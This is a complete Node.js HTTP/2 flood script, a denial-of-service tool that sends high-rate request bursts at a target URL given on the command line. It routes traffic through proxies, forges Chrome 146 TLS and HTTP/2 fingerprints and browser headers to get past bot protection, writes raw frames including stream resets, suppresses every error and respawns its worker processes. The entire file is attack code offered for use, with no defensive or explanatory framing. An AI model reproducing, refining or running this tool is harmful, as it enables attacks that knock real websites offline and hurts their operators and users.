const fs = require('fs')
	, http2 = require('http2')
	, http = require('http')
	, tls = require('tls')
	, net = require('net')
	, cluster = require('cluster')
const crypto = require('crypto');
const HPACK = require('hpack');
const os = require("os");
const errorHandler = error => {
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
// Chrome 146 cipher suites - exact order from TLS fingerprint
cplist = [
		'TLS_AES_128_GCM_SHA256',
		'TLS_AES_256_GCM_SHA384',
		'TLS_CHACHA20_POLY1305_SHA256',
		];
// Chrome 146 TLS 1.2 fallback ciphers (OpenSSL names)
const tls12Ciphers = [
		'ECDHE-ECDSA-AES128-GCM-SHA256',
		'ECDHE-RSA-AES128-GCM-SHA256',
		'ECDHE-ECDSA-AES256-GCM-SHA384',
		'ECDHE-RSA-AES256-GCM-SHA384',
		'ECDHE-ECDSA-CHACHA20-POLY1305',
		'ECDHE-RSA-CHACHA20-POLY1305',
		'ECDHE-RSA-AES128-SHA',
		'ECDHE-RSA-AES256-SHA',
		'AES128-GCM-SHA256',
		'AES256-GCM-SHA384',
		'AES128-SHA',
		'AES256-SHA',
		];
// Chrome 146 signature algorithms - exact 8 from fingerprint
const sigalgs = [
	'ecdsa_secp256r1_sha256',
	'rsa_pss_rsae_sha256',
	'rsa_pkcs1_sha256',
	'ecdsa_secp384r1_sha384',
	'rsa_pss_rsae_sha384',
	'rsa_pkcs1_sha384',
	'rsa_pss_rsae_sha512',
	'rsa_pkcs1_sha512',
];
let sig = sigalgs.join(':');

controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
	cipher() {
		return cplist[Math.floor(Math.random() * cplist.length)];
	}
};

process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
if (!/^https?:\/\//i.test(target)) {
	console.error('sent with http:// or https://');
	process.exit(1);
}
proxyr = proxyFile
if (isNaN(rps) || rps <= 0) {
	console.error('number rps');
	process.exit(1);
}
const MAX_RAM_PERCENTAGE = 70;
const RESTART_DELAY = 1000;
if (cluster.isMaster) {
  
	for (let counter = 1; counter <= thread; counter++) {
		cluster.fork();
	}
	const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script via', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= thread; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage percentage exceeded:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	setTimeout(() => process.exit(-1), time * 1000);
} else {
	setInterval(flood)
}

function flood() {
	var parsed = new URL(target);
	var cipper = headerFunc.cipher();
	var proxy = proxyr.split(':');
	
	function randstra(length) {
		const characters = "0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}

	function randstr(minLength, maxLength) {
		const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
const randomStringArray = Array.from({ length }, () => {
const randomIndex = Math.floor(Math.random() * characters.length);
return characters[randomIndex];
});

return randomStringArray.join('');
}

	const randstrsValue = randstr(25);
function generateRandomString(minLength, maxLength) {
					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}
const hd = {}
 function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
           const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};
const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 144, max: 146 },
        safari: { min: 17, max: 18 },
        brave: { min: 144, max: 146 },
        firefox: { min: 135, max: 139 },
        mobile: { min: 144, max: 146 },
        opera: { min: 118, max: 120 },
        operagx: { min: 118, max: 120 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const fullVersions = {
        brave: "146.0.7680.169",
        chrome: "146.0.7680.169",
        firefox: "139.0",
        safari: "18.5",
        mobile: "146.0.7680.169",
        opera: "120.0.5519.40",
        operagx: "120.0.5519.40"
    };

    // T?o header "Sec-CH-UA-Full-Version-List" t? gi? tr? full version
    const secChUAFullVersionList = Object.keys(fullVersions)
        .map(key => `"${key}";v="${fullVersions[key]}"`)
        .join(", ");
    const platforms = {
        chrome: "Win64",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux"
    };
    const platform = platforms[browser];
    const secChUaMobile = browser === "mobile" ? "?1" : "?0";
    const acceptEncoding = "gzip, deflate, br, zstd";
    const accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
    const acceptLanguages = [
        "en-US,en;q=0.9",
        "tr,en-US;q=0.9,en;q=0.8",
        "en-GB,en-US;q=0.9,en;q=0.8",
        "de,en-US;q=0.9,en;q=0.8",
        "fr,en-US;q=0.9,en;q=0.8",
    ];
    const acceptLang = acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)];

    // Chrome 146 exact header order from real browser fingerprint
    const secChUaPlatform = {
        chrome: '"Windows"', safari: '"macOS"', brave: '"Windows"',
        firefox: '"Windows"', mobile: '"Android"', opera: '"Windows"', operagx: '"Windows"'
    };

    const secChUaMap = {
        chrome:  `"Chromium";v="${version}", "Not-A.Brand";v="24", "Google Chrome";v="${version}"`,
        brave:   `"Chromium";v="${version}", "Not-A.Brand";v="24", "Brave";v="${version}"`,
        opera:   `"Chromium";v="${version}", "Not-A.Brand";v="24", "Opera";v="${version}"`,
        operagx: `"Chromium";v="${version}", "Not-A.Brand";v="24", "Opera GX";v="${version}"`,
        mobile:  `"Chromium";v="${version}", "Not-A.Brand";v="24", "Google Chrome";v="${version}"`,
        safari:  `"Safari";v="${version}", "AppleWebKit";v="605.1.15", "Not-A.Brand";v="24"`,
        firefox: `"Firefox";v="${version}", "Gecko";v="20100101", "Mozilla";v="${version}"`,
    };

    // Chrome 146 header order: pseudo-headers, sec-ch-ua, sec-ch-ua-mobile,
    // sec-ch-ua-platform, upgrade-insecure-requests, user-agent, accept,
    // sec-fetch-*, accept-encoding, accept-language, priority, cookie
    const headers = {
        ":method": "GET",
        ":authority": parsed.host,
        ":scheme": "https",
        ":path": parsed.pathname + parsed.search,
        "sec-ch-ua": secChUaMap[browser],
        "sec-ch-ua-mobile": secChUaMobile,
        "sec-ch-ua-platform": secChUaPlatform[browser],
        "upgrade-insecure-requests": "1",
        "user-agent": process.argv[8],
        "accept": accept,
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": acceptEncoding,
        "accept-language": acceptLang,
        "priority": "u=0, i",
        "cookie": process.argv[7],
    };

    return headers;
};
const browser = getRandomBrowser();
const headers = generateHeaders(browser);
	const agent = new http.Agent({
		host: proxy[0]
		, port: proxy[1]
		, keepAlive: true
		, keepAliveMsecs: 500000000
		, maxSockets: 50000
		, maxTotalSockets: 100000
	, });
	const Optionsreq = {
		agent: agent
		, method: 'CONNECT'
		, path: parsed.hostname + ':443'
		, timeout: 1000
		, headers: {
			'Host': parsed.host
			, 'Proxy-Connection': 'Keep-Alive'
			, 'Connection': 'Keep-Alive'
		, }
	, };
	connection = http.request(Optionsreq, (res) => {});
	// Chrome 146 TLS options - matching real browser fingerprint
	const cipherString = tls12Ciphers.join(':');
	const TLSOPTION = {
		ciphers: cipherString
		, sigalgs: sig
		, minVersion: 'TLSv1.2'
		, maxVersion: 'TLSv1.3'
		, secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL
		, ecdhCurve: "X25519:P-256:P-384"
		, rejectUnauthorized: false
		, ALPNProtocols: ['h2', 'http/1.1']
	, };

	function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = tls.connect({
			...TLSOPTION
			, host: parsed.host
			, port: 443
			, servername: parsed.host
			, socket: socket
		});
		tlsSocket.setKeepAlive(true, 60000);
    tlsSocket.allowHalfOpen = true;
    tlsSocket.setNoDelay(true);
    tlsSocket.setMaxListeners(0);

    return tlsSocket;
}
	connection.on('connect', function (res, socket) {
    const tlsSocket = createCustomTLSSocket(parsed, socket);
    socket.setKeepAlive(true, 100000);

    // Chrome 146 HTTP/2 settings - exact from akamai fingerprint: 1:65536;2:0;4:6291456;6:262144
    let clasq = {
        headerTableSize: 65536,
        enablePush: false,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
    };

    let hpack = new HPACK();
    


    const clients = [];
    const client = http2.connect(parsed.origin, {
		
		settings: clasq,
    "unknownProtocolTimeout": 10,
    "maxReservedRemoteStreams": 1000,
    "maxSessionMemory": 100,
   createConnection: () => tlsSocket
	});
clients.push(client);
client.setMaxListeners(0);
// Chrome 146 WINDOW_UPDATE increment: 15663105
const updateWindow = Buffer.alloc(4);
    updateWindow.writeUInt32BE(15663105, 0);
    client.on('remoteSettings', (settings) => {
        client.setLocalWindowSize(15663105, 0);
    });
    // Chrome 146 HTTP/2 SETTINGS frame: HEADER_TABLE_SIZE=65536, ENABLE_PUSH=0, INITIAL_WINDOW_SIZE=6291456, MAX_HEADER_LIST_SIZE=262144
    const frames = [
Buffer.from(PREFACE, 'binary'),
encodeFrame(0, 4, encodeSettings([
[1, 65536],
[2, 0],
[4, 6291456],
[6, 262144],
])),
encodeFrame(0, 8, updateWindow)
];
    client.on('connect', () => {
        client.ping((err, duration, payload) => {
            if (err) {
            } else {
            }
        });
        
    });

    clients.forEach(client => {
        const intervalId = setInterval(async () => {
            const requests = [];
            let count = 0;

                // Use exact Chrome 146 headers from generateHeaders
                const head = { ...headers };
                            
                if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                for (let i = 0; i < rps; i++) {
                const requestPromise = new Promise((resolve, reject) => {
                    // Chrome 146 priority: weight 256, depends_on 0, exclusive 1
                    const request = client.request(head, {
                        weight: 256,
                        depends_on: 0,
                        exclusive: true,
                    });
                    request.on('response', response => {
                    request.close(http2.constants.NO_ERROR);
                    request.destroy();
                    resolve();
                            });
                    request.on('end', () => {
                    count++;
                    if (count === time * rps) {
                    clearInterval(intervalId);
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
                    } else if (count=== rps) {
                    client.close(http2.constants.NGHTTP2_CANCEL);
                    client.destroy();
                    clearInterval(intervalId);
                    }
                    reject(new Error('Request timed out'));
                    });
                    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                });

                const packed = Buffer.concat([
                    Buffer.from([0x80, 0, 0, 0, 0xFF]),
                    hpack.encode(head)
                ]);

                let streamId =1;
                let streamIdReset = 1;
                const flags = 0x1 | 0x4 | 0x8 | 0x20;
                
                
                const encodedFrame = encodeFrame(streamId, 1, packed, flags);
                
                const frame = Buffer.concat([encodedFrame]);
                if (streamIdReset >= 5 && (streamIdReset - 5) % 10 === 0) {
                
                tlsSocket.write(Buffer.concat([
                  encodeFrame(streamId, 0x3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0x0),
                  frames
                 ]));


                } else if (streamId === 2 && (streamId - 2) % 5 === 0) {
                tlsSocket.write(frames[0]);
}
              
                streamIdReset += 2;
                streamId += 2;
                requests.push({ requestPromise, frame });
            }
            try {
                await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            } catch (error) {
            }
                }
                
        }, 500);
        

      
    });

		
		client.on("close", () => {
			client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return 
		});




client.on("error", error => {
    if (error.code === 'ERR_HTTP2_GOAWAY_SESSION') {
        console.log('Received GOAWAY error, pausing requests for 10 seconds\r');
        shouldPauseRequests = true;
        setTimeout(() => {
           
            shouldPauseRequests = false;
        },2000);
    } else if (error.code === 'ECONNRESET') {
        
        shouldPauseRequests = true;
        setTimeout(() => {
            
            shouldPauseRequests = false;
        }, 2000);
    }  else {
    }

    client.destroy();
			tlsSocket.destroy();
			socket.destroy();
			return
});

	});


	connection.on('error', (error) => {
		connection.destroy();
		if (error) return;
	});
	connection.on('timeout', () => {
		connection.destroy();
		return
	});
	connection.end();
}//
